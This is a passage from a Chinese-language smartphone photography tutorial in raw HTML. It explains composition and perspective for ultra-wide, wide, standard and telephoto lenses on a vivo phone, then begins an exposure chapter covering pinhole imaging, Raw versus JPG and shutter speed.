data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2776\" data-rawheight=\"3701\" class=\"origin_image zh-lightbox-thumb\" width=\"2776\" data-original=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_r.jpg\"></figure><p>而当我们了解到超广角的这些特点以后，有以下建议：</p>\n<p><b>掌握三段式拍摄手法</b></p>\n<p>相信你一定看过很多类似的照片，其实我现在只要是一描述，你就一定会在脑海中浮现出类似的照片。这些照片一般来说最远处都是天边的云彩或者是雪山，中间可能是森林或者是草原，而画面的最近处，也就是底部会有一些有意思的石头或者是花朵作为前景。</p>\n<p>而这就是目前风光摄影师们最为常见的拍摄手法，三段式。比如下面这一张照片，就是最为经典的三段式拍摄手法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_r.jpg\"></figure><p>由于这个拍摄手法过于常见，所以我们甚至是很多时候会称之为「风光糖水」。但是这并不一定是贬义词，因为如果大家都采用某一种形式进行拍摄，那这种形式可能就是经典。而摄影师们使用这种三段式拍摄是有其深层原因的，这就是超广角画面中要安排的内容太多了。</p>\n<p>我们使用超广角拍摄时，会发现画面中很容易容纳许多和实际想要的画面不相关的内容。所以这就需要我们合理的安排画面中的内容。而这种三段式的拍摄手法，则是非常合理地把画面直接分割为三个部分，这就是：</p>\n<p><b>远景，中景，和近景。</b></p>\n<p>而其中最重要的部分就是近景。但有意思的是，恰恰近景是最容易被忽视的那一个。几乎所有的职业风光摄影师一半的时间是在去风景的路上，而另一半是在找近景的路上。</p>\n<p>我们可以通过下面这张图来进行一个直接的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_r.jpg\"><figcaption>无前景</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_r.jpg\"><figcaption>有前景</figcaption></figure><p>你会发现有近景的画面不仅仅是因为近景的加入多了一些层次，更重要的是还让画面中有了一种立体感。</p>\n<p><b>尝试低角度</b></p>\n<p>另一个非常容易造成画面冲击力的方式就是低角度使用超广角。不过这个低角度拍摄并不是超广角的专属。归根到底，这是在说摄影拍摄中角度选取的重要性。</p>\n<p>其实有一定的经验摄影师和小白摄影师有一个很重要的区分点，这就是职业摄影师从来不会「身高摄影」。这个词你可能是第一次听说，那就对了，因为这个词是我自己造的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_r.jpg\"></figure><p>所谓的「身高摄影」，是说很多人拍摄的角度往往完全就是根据它的身高来决定的。大多数人遇到场景时，掏出手机直接就拍摄，所以你会发现拍摄出来的画面大致相同，毫无陌生感。但其实你只要是自己尝试更换一些自己身高以外的角度进行观察和拍摄，你会发现就算是你生活中再普通，再常见的视角都会完全不一样的视觉感受。</p>\n<p>低角度就是一个最好的证明。</p>\n<p>比如下面这张图就是最好的一个案例。画面中的本来是草原上两朵再常见不过的小花，但是当我尝试更换一个角度，从下向上进行拍摄，这两朵小花不仅拥有了透过阳光的质感，你也会发现一种「它们本身努力生长的情感」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_r.jpg\"></figure><p>这就是更换角度的魔力，而其实生活中，这种仅仅是通过更换视角就可以把普通的场景直接变为质感大片的角度随处都是。所以，当你使用超广角时，拿出手机以后不要着急。你先远近高低各不同地找找，也许就会发现很多不一样的角度。</p>\n<p><b>尝试放大趣味点</b></p>\n<p>随着今天摄影师的普及，很多摄影师的名言也逐渐开始普及起来。亚当斯的话就不说了，就连罗伯特·卡帕的「如果你拍得不够好，是因为你拍得不够近」也在今天小有名气。</p>\n<p>不过需要说明的是，这句话罗伯特·卡帕说是有一个范围的，因为它本身是一个战地摄影师（诺曼底登陆拍摄后，胶卷损坏的就是他）。既然是战地摄影师，「胆量」就是一个摄影师的衡量要素。尤其是当时没有现在这么好的长焦系统，摄影师基本上想要拍摄好的画面，自然只有贴近「真实战场」。</p>\n<p>但话虽如此，并不是说这句话对于摄影不重要，恰恰相反，这句话正是指导我进行摄影的诸多方面。</p>\n<p>首先客观上足够近的确可以帮你拥有全新的视觉语言，尤其是超广角。正如前面所说，因为超广角的一个重要特性就是近大远小的特点显著，所以这让超广角镜头有了一种放大镜的感觉。比如下面这张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_r.jpg\"></figure><p>动物身体的某一部分，因为被超广角放大了，所以整个画面开始变得妙趣横生起来。因此每当有人问起我超广角到底有什么拍摄秘诀的时候，我会说：</p>\n<p><b>「当别人拍高时，你拍低，当比人拍远时，你拍近。」</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_r.jpg\"></figure><p>至于什么是主观上的近，那么我就留在这摄影眼的最后一部分再说吧。</p>\n<h3>广角镜头（1X/等效焦距 23mm）</h3>\n<p>都说只听新人笑，未听旧人哭。我想现在对这句话感触最深的一定是所有安卓影像旗舰的「主镜头」。因为今天很多手机厂商几乎已经很少主动宣传主镜头的拍摄能力，基本上都是围绕着超广角或者是超长焦。这其实潜移默化也影响了很多用户自己本身的使用习惯。</p>\n<p>至少我自己就是这样的，我会发现我使用超广角和长焦拍摄的概率远高于使用 1X 广角镜头。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_r.jpg\"></figure><p>当然这也不能完全是我喜新厌旧，因为其实在摄影领域里，23mm 本身并不是热门焦段。它的劣势在于本身还具有一定的广角性质，画面有着强烈的透视风格，另一方面它并不是一个适合常规人像拍摄的焦距，拍摄有门槛。不过，这并不是说这个焦距不好。它也有自己的优势，比如这是人文摄影中最为经典的焦段之一。</p>\n<p>手机厂商选择这个焦段还有一个原因是，它可以让「日常拍摄主题拍摄内容覆盖更多题材」。因为在多镜头之前，我们「没得选」，需要一个什么都能拍的焦距选择，那么的确 23mm 左右是为适合的一个选择。不过并不是说，23mm 在今天多镜头的环境下没有用武之地，它依然有着它独特的优势。</p>\n<p><b>最好的画质</b></p>\n<p>其实在多颗镜头推出的初期，还有一个所谓的「主副镜头」的概念，虽然这一概念是完全错误的，可是今天它的影响还没有完全消失。但是这样的概念出现，归根到底是因为在多镜头出现的初期，其它新增焦距镜头的画质和元老级别的 23mm 焦段的调教经验相差很多。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_r.jpg\"></figure><p>所以这也就造成了，画质上的差距。</p>\n<p>因此，如果你今天想要拍摄的画面需要最好的画质保证，那么只要放心的使用 1X 镜头的 23mm 镜头即可。</p>\n<p><b>不夸张的广角效果</b></p>\n<p>在专业相机的领域里，其实是有一个镜头焦距的大致分类的。比如说小于 35mm ，我们一般就认为是广角镜头的区间，那么显然 23mm 是包含在这个区间以内的。所以在之前我们提到的超广角所具有的特征，广角镜头一定会具备，只不过是「症状更轻」。</p>\n<p>比如画面的边缘拉伸，画面的中央挤压特性等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_r.jpg\"></figure><h3>长焦镜头（5X/等效焦距 125mm）</h3>\n<p>长焦镜头在摄影中的定义一般来说要在 85mm 及以上的焦距。大多数人对于长焦镜头的理解基本上只是局限在「拍得远」。的确，某种意义上来说长焦镜头甚至是望远镜的代名词。随着长焦数值的增加，我们可以看到的距离也就更远。</p>\n<p>但是拍得远，仅仅是长焦镜头的一个要素。对于长焦镜头，摄影师更加看重的是它相对于超广角镜头完全相反的一面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_r.jpg\"></figure><p>在前面我们知道超广角镜头拍摄的画面更广，画面中近大远小的效果更明显。那么长焦镜头其实则是完全相反的。对于长焦镜头来说：</p>\n<p>我们拍摄的范围会很窄，与此同时，拍摄的内容更远，并且画面不会再有特别夸张的透视效果。</p>\n<p><b>主动的减法</b></p>\n<p>如果说超广角镜头的难处是画面中包含了一切，需要摄影师主动安排和调整，那么长焦镜头则会相对主动一些。因为长焦镜头拍摄的很窄，所以大多数情况下使用长焦镜头，就会主动的减去画面中的不必要组成部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2059\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_r.jpg\"></figure><p>如果你是刚刚学习摄影，或者是对于构图不熟练的新手拍摄者，那么就可以多多尝试使用长焦镜头进行拍摄。比如上图，我们就可以一目了然的看到画面中的主体是月亮。拍摄时，完全不需要考虑地面或者是其它景物。</p>\n<p><b>透视与层次</b></p>\n<p>我自己是非常喜欢使用长焦镜头进行拍摄的。尤其是在一些风景作品中，我甚至是爱长焦超过超广角。因为如果说超广角镜头的特点是可以让空间中的远近关系明确的话，那么长焦镜头则完全相反。它一个很重要的特性就是「压缩空间」，让画面中的远近关系模糊掉。</p>\n<p>比如下面这张图，我们可以看到画面中的景物远近关系并不明显，好像每一个部分都是「被压瘪了一样」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_r.jpg\"></figure><p>这样的视觉效果最大的一个好处就是可以给我们的画面带来非常明显的层次，而这种层次也就是照片中韵律和节奏的来源之一。我这样说可能有一点抽象，我还是使用一张图作为案例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"></figure><p>这张图是我在新疆拍摄的，当时太阳正在落上，光线正在远处的山间移动。由于使用了 vivo X60 Pro+ 长焦镜头拍摄，125mm 的焦距让整个草原景色有着非常清晰的线条。而这些线条就像是人类的骨骼，给整幅画面以筋骨。而我所说的韵律正是这些隐藏在长焦照片风景中的线。</p>\n<p>比如我换另一张照片，如下图，我们依然可以在画面中寻找到类似的线条。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_r.jpg\"></figure><p>所以我自己来判断一张长焦风光照是不是美，某种意义上就是在看画面中的「线条美不美」。而我所说的韵律和节奏正是这些曲线流动的方式。</p>\n<p>这些优美的线条会把画面分割为不同的部分，这种风格可能很复杂也可能很简单。比如下面这张图中，我们只会看到一条线。而正是这条线把地面和天空简单地分开。这张图看似简单，但实际上当你使用非长焦镜头时却无法获得。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_r.jpg\"></figure><p>可能这就是我喜欢长焦镜头的原因，它非常优雅。你需要寻找画面中流动的线条，并且尝试用这些线条为画面分离出层次。</p>\n<p>由于本篇文章并不涉及后期，但是既然已经提到了韵律和节奏。正好就在这里趁热打铁，来分享一个后期思路。还是刚才的照片，这是它后期前后的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_r.jpg\"><figcaption>修图前</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"><figcaption>修图后</figcaption></figure><p>仔细观察发现，这张照片除了去除一些杂物以外，还有一个很重要的不同，这就是后者显然更加凸显画面中原有的线条和光线。</p>\n<p>这种「凸显」，就是著名的风光摄影师亚当斯所说的那句，摄影中：</p>\n<blockquote>前期拍摄就是谱曲，而后期就是演奏。</blockquote>\n<p>我在后期时，会先看整个照片的韵律到底在哪里。比如我看到画面中的各种线条非常优美，那我就强化这种优美。而方式也非常简单，让画面中线条分割的两部分对比更加明显。亮的更加亮，暗的更加暗。这种后期方式其实无处不在，几乎很多风光摄影大片都是如此。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_r.jpg\"></figure><p>当然了，后期的思路和理念很多，以后如果有机会再和大家分享，很可能又是四万字。</p>\n<p>不过，这也是前面审美章节的又一例证，如果你精通音乐，自然就能立刻感受到照片中的韵律。一个不算冷门的知识，风光大师安塞尔·亚当斯其实本身是一个钢琴家。</p>\n<p>所以摄影啊，最重要的一定是摄影以外的东西。</p>\n<p><b>避免晃动</b></p>\n<p>超长焦镜头是最近几年才出现在智能手机上的，归根到底是因为，长焦镜头需要的技术门槛实在是太高了。其实不仅仅是技术门槛，使用门槛也极高。因为对于长焦镜头来说，由于光学的物理特性，导致：</p>\n<p>「长焦镜头对于防抖要求极高」。</p>\n<p>相信很多使用长焦镜头的用户会发现，长焦镜头很容易「糊照片」。具体的原因，在后面的曝光章节中会详细阐述，但在这里你只要知道，使用长焦镜头时尽量要保证画面的稳定 。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_r.jpg\"></figure><p>需要强调的是，长焦镜头可不是越长越好。现在一些厂商为了「技术竞赛」，完全不顾用户的真实体验，一些超长焦，甚至是百倍变焦频出。他们对于长焦的理解的意义仅为「远」，那么看到这里你应该也知道这种远并不是长焦的奥义。过长的焦距很多时候也大大限制它的使用场景，比如焦距只要超过 150mm ，室内就完全无法使用，当然你实力雄厚，家里是几百平的大平层就当我没说。</p>\n<h3>标准镜头（2X/等效焦距 50mm）</h3>\n<p>如果要说在目前所有手机提供的镜头焦段中，哪一个适合拍摄人像，那么我一定会告诉你选择这颗 2X 的 50mm 镜头。我们前文所阐述的超广角、长焦恰好是镜头焦距的两个极端。那么 50mm 恰好是他们的中点。也就是说：</p>\n<p>「50mm 没有夸张的透视效果，也有一个不窄不宽的拍摄范围。」</p>\n<p>也正是因为这个原因，50mm 左右的镜头也会被摄影师们称之为「标准焦距」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_r.jpg\"></figure><p>而它是手机上最适合拍摄人像的一个关键原因就在于一方面由于没有夸张的透视效果，可以保证人物主体不变形，另一方面这个焦距可以很好地兼顾环境和人物之间的关系。</p>\n<p>如果你正在使用这个焦距的镜头拍摄人物，此时如果向前走一步，就可以拍摄人物的大肖像特写。而这样的肖像特写会着重表现人物的表情和心理状态。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_r.jpg\"></figure><p>而如果你退一步，就可以拍摄人物的环境肖像。环境肖像具有更强的叙述性，可以让我们看清画面中的因果关系，更加注重的是人物的动作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_r.jpg\"></figure><p>这里可以给所有苦恼给女朋友拍照片的男孩子们敲一下黑板上的重点，使用标准镜头拍摄姑娘成功率更高，更难出现一些意外状况。也算做是一个重要的「保命技能」吧。</p>\n<p>当然标准焦距除了人像以外，静物尤其是美食静物也是很好的选择。标准焦距既不会让食物或者是杯具变形，也不需要你本身离食物过远，不方便摆盘或者是调整。既然说到美食，就分享一个生活中最常见的一个小技巧。大家平时出去打卡餐厅可能会需要俯拍食物，但是使用 1X 23mm 焦距时很容易出现自己手的阴影，那么如果我们使用 2X 50mm 标准焦距就可以很大程度上避免这样的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_r.jpg\"></figure><p>以上，就是四颗不同镜头的一些简单总结。但是需要说明的是，这只是常规意义上的经验，虽然打破常规这句话你可能听过很多次了，但其实本章节所阐述的「摄影眼」，最终的意义就是，寻找非寻常视角。</p>\n<p>归根到底，所谓的摄影眼，就是我们看待世界的方式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_r.jpg\"></figure><p>从技术来说，一个会拍照的摄影师，眼睛是会「自动变焦」的。当它走进一个场景，它的眼睛就会直接自动出现不同焦距的镜头在此场景中的效果。当然你也可以采用最笨的方式，直接更换不同焦距的镜头尝试取景。尤其是今天手机镜头的出现，更换镜头只需要通过点按画面中的按钮。而在以前，可是需要摄影师不断手动更换镜头才行。</p>\n<p>本章节的题目叫做镜头中的摄影眼，这句话的更想强调的是不同镜头带给我们的视野感受。但决定一张照片最终视野的并不是「镜头的焦距」，而是我们「内心的眼睛」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_r.jpg\"></figure><p>这就是我前面没有说完的，「如果你拍得不够好，是因为你拍得不够近」中，主观的近。尤其是我们想要为我们的照片注入情感，我们就需要用心去靠近。</p>\n<p>见天地者，即使长焦镜头也能展辽阔。</p>\n<p>见微小者，即使广角镜头也能嗅蔷薇。</p>\n<h2>04. 明与暗</h2>\n<p>在开始这一章节之前，我们需要做一件事，这就是了解相机的结构。不过别担心，我保证讲解的相机结构是阅读这篇文章的每一个人都可以读懂。</p>\n<h3>光的捕捉</h3>\n<p>今天的市场上，相机的种类可以说是五花八门。你打开各种交易网站，各类相机琳琅满目。就不说各种非常细致的分类了，就说价格区间也是相当的大。从几十块到几十万，想买多贵的都有。但是即使如此，几十万块的相机和几十块的相机基本原理都完全相同。</p>\n<p>就算是相机和手机，两种摄影的原理也相同。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_r.jpg\"></figure><p>这是因为摄影的本质来自于一个我们都学过的物理知识：</p>\n<p>「小孔成像」。</p>\n<p>是的，所有相机拍摄的画面，都是透过一个小孔，把画面映射到一个记录光线的载体中，而为了保证映射的画面不被干扰，所以所有的这一切都被放置到一个不透光的盒子中发生。</p>\n<p>当然这样说比较抽象，所以我准备了一个非常简单的动图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"639\" data-rawheight=\"451\" data-thumbnail=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"639\" data-original=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_r.jpg\"></figure><p>在这个图中我们可以看到，所谓透光的小孔就是镜头，而密封的盒子就是机身，而对于手机来说，我们所谓的 CMOS 传感器就是记录光线的载体。</p>\n<p>其实这个记录光线的载体材质是有演变的，在摄影诞生初期甚至是各种金属板。当然最著名的两个就是胶片和今天的光学传感器。他们的目的无非就是把光线记录下来。因为今天我们的手机都是使用数码光学传感器，所以这篇文章里就只谈谈数码曝光流程。</p>\n<p>在开始之前，要说明的是，这里可不是跟摄影无关的理论知识。这里的描述对于你理解曝光有着至关重要的作用，它是一种基础。所以，这一部分千万不要跳过阅读。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_r.jpg\"></figure><p>所以当我们拍摄一张照片时，相机都在做什么呢？</p>\n<p>当我们按下快门的那一刻，光线透过小孔进入密封的机身，然后传感器通电，此时光信号转换为电信号，电信号再被传感器记录下来。但此时记录下来的信号，仅仅是单纯的「数字」。而这些记录下来的数字，我们叫做「Raw」文件。</p>\n<p>这个词，你可能第一次听说。但是你打开 vivo X60 Pro+ ，在专业模式里，就有一个开关按钮，打开以后，你就可以记录 Raw ，也就是这些原始的画面数据。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_r.jpg\"></figure><p>但 Raw 格式，还不是我们所说的画面。我们想要真正的看到画面，我们的相机需要对这些数字进行翻译。也就是 Raw 格式变为我们常见的 JPG 以后，才是我们熟知的照片。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_r.jpg\"></figure><p>但是这种「翻译」有两个问题：</p>\n<ol>\n<li>翻译是有风格的，这也是为什么同样拍摄一个场景，大家的照片色彩风格不同。比如本篇文章的 vivo X 系列手机有着很强烈的类似徕卡的油画色调。而有风格，就会有喜爱。比如我自己就很反对一些品牌过度的颜色饱和。</li>\n<li>翻译是有损失的，因为 JPG 的结果是 Raw 格式的「取舍」。所以只要是 JPG 就意味信息丢失了。</li>\n</ol>\n<p>不过 Raw 格式的问题也是显而易见，它的存储量很大，一张就要几十M，而且它必须要后期，不然你甚至无法分享社交网络。</p>\n<p>所以这里的建议是，大多数情况用 JPG 够了，如果你真的喜欢后期，想要后期宽容度高，那么就使用 Raw。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_r.jpg\"></figure><h3>光的控制</h3>\n<p>说回正题，曝光。</p>\n<p>拍完一张照片，摄影师经常会给找一个评价，比如曝光太过了，或者是曝光不够。而这里的曝光不够，或者是曝光太过了，就是在说：</p>\n<p><b>进入相机的光线是否适量。</b></p>\n<p>所以我们要弄清楚第一个问题：</p>\n<p><b>相机是如何控制进入光线的量？</b></p>\n<p>我们回顾刚才的相机原理，传感器在记录光线是需要通电的。那么可想而知，通电时间越长，光线进入的总量也就会越多。</p>\n<p>而这个「通电时间」，就是我们所说的<b>「快门速度」。</b></p>\n<p>我们经常会在相机的参数里，看到一个「秒」，这个就是快门速度。比如下图中，快门速度就是 1/950S。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" 